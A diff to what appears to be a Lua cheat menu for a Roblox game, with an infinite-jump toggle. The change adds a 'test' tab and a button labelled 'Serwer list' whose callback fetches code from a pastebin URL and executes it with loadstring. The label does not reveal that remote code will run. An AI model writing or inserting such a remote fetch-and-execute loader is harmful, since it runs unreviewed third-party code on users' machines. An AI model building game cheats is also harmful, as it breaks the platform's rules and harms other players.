@@ -99,6 +99,19 @@ local inf_jump_toggle = player_tab:Toggle({
 })
 
 local misc_tab = window:Tab({
+	Title = "test",
+	Icon = "file-code"
+})
+
+local inf_yield_button = misc_tab:Button({
+	Title = "Serwer list",
+	Desc = "serwer list",
+	Callback = function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/WZYjUXvg"))()
+	end
+})
+
+local misc_tab = window:Tab({
 	Title = "Misc",
 	Icon = "file-code"
 })
